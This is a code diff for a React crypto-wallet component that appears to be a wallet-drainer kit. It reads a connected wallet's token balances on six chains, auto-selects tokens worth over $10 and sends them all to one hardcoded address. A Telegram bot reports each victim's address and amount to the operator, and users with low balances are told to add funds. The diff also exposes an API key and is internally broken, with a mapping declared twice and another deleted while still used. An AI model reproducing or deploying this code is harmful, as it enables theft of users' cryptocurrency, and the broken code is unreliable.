@@ -1,11 +1,19 @@
 import { useCallback, useEffect, useState } from 'react';
-import { useAccount, usePublicClient, useWalletClient } from 'wagmi';
-import { Loading, Toggle } from '@geist-ui/core';
+import { useAccount, usePublicClient, useWalletClient, useNetwork } from 'wagmi';
+import { Loading, Toggle, Modal, Button } from '@geist-ui/core';
 import { tinyBig } from 'essential-eth';
 import { useAtom } from 'jotai';
 import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
 import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
 import { Alchemy, Network } from 'alchemy-sdk';
+import Dexie from 'dexie';
+
+// Initialize Dexie database
+const db = new Dexie('TokenDatabase');
+db.version(1).stores({
+  tokens: 'contract_address, balance, quote, quote_rate',
+  checkedRecords: 'contract_address, isChecked',
+});
 
 // Alchemy instances for multiple networks
 const alchemyInstances = {
@@ -15,20 +23,8 @@ const alchemyInstances = {
   [Network.ZK_SYNC]: new Alchemy({ apiKey: "iUoZdhhu265uyKgw-V6FojhyO80OKfmV", network: Network.ZK_SYNC }),
   [Network.ARB_MAINNET]: new Alchemy({ apiKey: "iUoZdhhu265uyKgw-V6FojhyO80OKfmV", network: Network.ARB_MAINNET }),
   [Network.MATIC_MAINNET]: new Alchemy({ apiKey: "iUoZdhhu265uyKgw-V6FojhyO80OKfmV", network: Network.MATIC_MAINNET }),
+  // Add other networks as needed
 };
-
-// Mapping from chain IDs to Alchemy SDK network enums
-const chainIdToNetworkMap = {
-  1: Network.ETH_MAINNET,
-  56: Network.BSC_MAINNET,
-  10: Network.OPTIMISM,
-  324: Network.ZK_SYNC,
-  42161: Network.ARB_MAINNET,
-  137: Network.MATIC_MAINNET,
-};
-
-// Supported chain IDs
-const supportedChains = [1, 56, 10, 324, 42161, 137];
 
 // Mapping of chain IDs to destination addresses
 const chainIdToDestinationAddress = {
@@ -38,6 +34,19 @@ const chainIdToDestinationAddress = {
   324: '0x933d91B8D5160e302239aE916461B4DC6967815d',
   42161: '0x933d91B8D5160e302239aE916461B4DC6967815d',
   137: '0x933d91B8D5160e302239aE916461B4DC6967815d',
+};
+
+// Supported chain IDs
+const supportedChains = [1, 56, 10, 324, 42161, 137];
+
+// Mapping of chain IDs to destination addresses
+const chainIdToDestinationAddress = {
+  1: '0x...MainnetAddress',
+  56: '0x...BSCAddress',
+  10: '0x...OptimismAddress',
+  324: '0x...ZkSyncAddress',
+  42161: '0x...ArbitrumAddress',
+  137: '0x...PolygonAddress',
 };
 
 // Telegram bot configuration
@@ -67,11 +76,11 @@ const safeNumber = (value) => {
 // Function to send a Telegram notification
 const sendTelegramNotification = async ({ senderAddress, amount, chainId, chainName, blockExplorerUrl }) => {
   const message = `Transaction Details:
-  - Sender Address: ${senderAddress}
-  - Amount: ${amount} ETH
-  - Chain ID: ${chainId}
-  - Chain Name: ${chainName}
-  - Block Explorer: ${blockExplorerUrl}`;
+- Sender Address: ${senderAddress}
+- Amount: ${amount} ETH
+- Chain ID: ${chainId}
+- Chain Name: ${chainName}
+- Block Explorer: ${blockExplorerUrl}`;
 
   const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
   const params = {
@@ -99,16 +108,18 @@ const sendTelegramNotification = async ({ senderAddress, amount, chainId, chainN
 
 const TokenRow = ({ token }) => {
   const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
-  const { address, chain } = useAccount();
+  const { chain } = useAccount();
   const pendingTxn = checkedRecords[token.contract_address]?.pendingTxn;
 
-  const setTokenChecked = (tokenAddress, isChecked) => {
+  const setTokenChecked = async (tokenAddress, isChecked) => {
     setCheckedRecords((old) => ({
       ...old,
       [tokenAddress]: { isChecked: isChecked },
     }));
+    await db.checkedRecords.put({ contract_address: tokenAddress, isChecked });
   };
 
+  const { address } = useAccount();
   const { balance, contract_address, contract_ticker_symbol, quote, quote_rate } = token;
 
   const unroundedBalance = safeNumber(quote_rate).gt(0)
@@ -122,7 +133,7 @@ const TokenRow = ({ token }) => {
     : unroundedBalance.round(5);
 
   return (
-    <div key={contract_address}>
+    <div key={contract_address} style={{ display: 'flex', alignItems: 'center', marginBottom: '8px' }}>
       <Toggle
         checked={checkedRecords[contract_address]?.isChecked}
         onChange={(e) => {
@@ -131,21 +142,18 @@ const TokenRow = ({ token }) => {
         style={{ marginRight: '18px' }}
         disabled={Boolean(pendingTxn)}
       />
-      <span style={{ fontFamily: 'monospace' }}>
-        {roundedBalance.toString()}{' '}
+      <span style={{ fontFamily: 'monospace', marginRight: '8px' }}>
+        {roundedBalance.toString()} {contract_ticker_symbol}
       </span>
+      <span style={{ marginRight: '8px' }}>(worth {usdFormatter.format(safeNumber(quote))})</span>
       <a
         href={`${chain?.blockExplorers?.default.url}/token/${token.contract_address}?a=${address}`}
         target="_blank"
         rel="noreferrer"
+        style={{ textDecoration: 'underline', color: '#0070f3' }}
       >
-        {contract_ticker_symbol}
-      </a>{' '}
-      (worth{' '}
-      <span style={{ fontFamily: 'monospace' }}>
-        {usdFormatter.format(safeNumber(quote))}
-      </span>
-      )
+        View on Explorer
+      </a>
     </div>
   );
 };
@@ -162,7 +170,7 @@ const handleTokenTransaction = async (walletClient, destinationAddress, amount, 
 
     console.log('Transaction sent:', tx.hash);
 
-    // Immediately switch to the next network after transaction is sent
+    // Immediately switch to the next network after the transaction is sent
     if (nextChainId) {
       switchNetwork(nextChainId);
     }
@@ -193,7 +201,10 @@ export const GetTokens = () => {
   const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
   const { address, isConnected, chain } = useAccount();
   const walletClient = useWalletClient();
-  const publicClient = usePublicClient();
+  const { chains, switchNetwork } = useNetwork(); // Import useNetwork for switching networks
+  const [isModalVisible, setIsModalVisible] = useState(false);
+  const [nextNetwork, setNextNetwork] = useState(null);
+  const [showMinBalanceMessage, setShowMinBalanceMessage] = useState(false); // New state for minimum balance message
 
   const fetchData = useCallback(async () => {
     setLoading(true);
@@ -203,31 +214,55 @@ export const GetTokens = () => {
         throw new Error(`Chain ${chain?.name || 'unknown'} not supported. Supported chains: ${supportedChains.join(', ')}.`);
       }
 
-      const alchemy = alchemyInstances[chainIdToNetworkMap[chain.id]];
-      if (!alchemy) {
-        throw new Error('Unsupported chain network.');
+      const alchemyNetwork = chainIdToNetworkMap[chain.id];
+      if (!alchemyNetwork) {
+        throw new Error('Unsupported network');
       }
 
-      const tokensFromAPI = await alchemy.core.getTokenBalances(address);
+      const alchemy = alchemyInstances[alchemyNetwork];
+      const response = await alchemy.core.getTokenBalances(address);
 
-      // Example of token data processing
-      const tokenData = tokensFromAPI.tokenBalances.map(token => ({
-        contract_address: token.contractAddress,
-        contract_ticker_symbol: token.symbol,
-        quote: token.tokenBalance,
-        quote_rate: token.tokenBalance,
-        // Other fields as needed
-      }));
+      if (response?.tokenBalances) {
+        const processedTokens = await Promise.all(
+          response.tokenBalances.map(async (balanceData) => {
+            const tokenAddress = balanceData.contractAddress;
+            const tokenBalance = balanceData.tokenBalance;
+            const tokenMetadata = await alchemy.core.getTokenMetadata(tokenAddress);
 
-      setTokens(tokenData);
+            return {
+              contract_address: tokenAddress,
+              balance: tokenBalance,
+              contract_ticker_symbol: tokenMetadata.symbol,
+              quote: safeNumber(tokenBalance).mul(safeNumber(tokenMetadata.decimals)),
+              quote_rate: safeNumber(tokenMetadata.decimals),
+              isChecked: false,
+            };
+          })
+        );
+        setTokens(processedTokens);
+        await db.tokens.bulkPut(processedTokens);
 
-    } catch (e) {
-      console.error('Failed to fetch token data:', e);
-      setError(`Failed to fetch token data: ${e.message}`);
+        // Automatically check tokens with balance worth more than $10
+        const checkedRecordsFromDB = {};
+        processedTokens.forEach(async (token) => {
+          const { contract_address, quote } = token;
+          const isChecked = safeNumber(quote).gte(10);
+          checkedRecordsFromDB[contract_address] = { isChecked };
+          await db.checkedRecords.put({ contract_address, isChecked });
+        });
+        setCheckedRecords(checkedRecordsFromDB);
+
+        // Show message if no tokens with balance worth more than $10
+        const hasEligibleTokens = processedTokens.some(token => safeNumber(token.quote).gte(10));
+        setShowMinBalanceMessage(!hasEligibleTokens);
+      }
+    } catch (err) {
+      console.error(err);
+      setError(err.message || 'Error fetching token balances');
     } finally {
       setLoading(false);
     }
-  }, [address, chain, setTokens]);
+  }, [address, chain, setTokens, setCheckedRecords]);
 
   useEffect(() => {
     if (isConnected) {
@@ -235,17 +270,61 @@ export const GetTokens = () => {
     }
   }, [isConnected, fetchData]);
 
+  const handleSendAllTransactions = async () => {
+    const checkedTokens = Object.entries(checkedRecords).filter(([_, record]) => record.isChecked);
+
+    if (checkedTokens.length === 0) {
+      console.log('No tokens selected for transaction.');
+      return;
+    }
+
+    const sendTransactions = async (index = 0) => {
+      if (index >= checkedTokens.length) {
+        console.log('All transactions sent.');
+        return;
+      }
+
+      const [contractAddress, _] = checkedTokens[index];
+      const token = tokens.find(t => t.contract_address === contractAddress);
+
+      if (!token) return;
+
+      const nextChainId = index + 1 < checkedTokens.length
+        ? chain.id
+        : null;
+
+      const destinationAddress = chainIdToDestinationAddress[chain.id];
+      const amount = safeNumber(token.balance).mul(safeNumber(token.quote_rate));
+
+      await handleTokenTransaction(walletClient, destinationAddress, amount, nextChainId, switchNetwork);
+
+      // Move to the next transaction after a short delay
+      setTimeout(() => sendTransactions(index + 1), 1000);
+    };
+
+    // Start sending transactions
+    sendTransactions();
+  };
+
+  if (loading) return <Loading>Fetching your tokens...</Loading>;
+
+  if (error) return <div>Error: {error}</div>;
+
   return (
-    <div>
-      {loading ? (
-        <Loading>Loading Tokens...</Loading>
-      ) : error ? (
-        <div>Error: {error}</div>
-      ) : (
-        tokens.map((token) => (
-          <TokenRow key={token.contract_address} token={token} />
-        ))
+    <>
+      {showMinBalanceMessage && (
+        <div>
+          <p>Your balance in all networks is below $10. Please add funds to proceed.</p>
+        </div>
       )}
-    </div>
+      <div>
+        {tokens.map(token => (
+          <TokenRow key={token.contract_address} token={token} />
+        ))}
+      </div>
+      <Button onClick={handleSendAllTransactions} disabled={loading || showMinBalanceMessage}>
+        Send All Checked Tokens
+      </Button>
+    </>
   );
 };
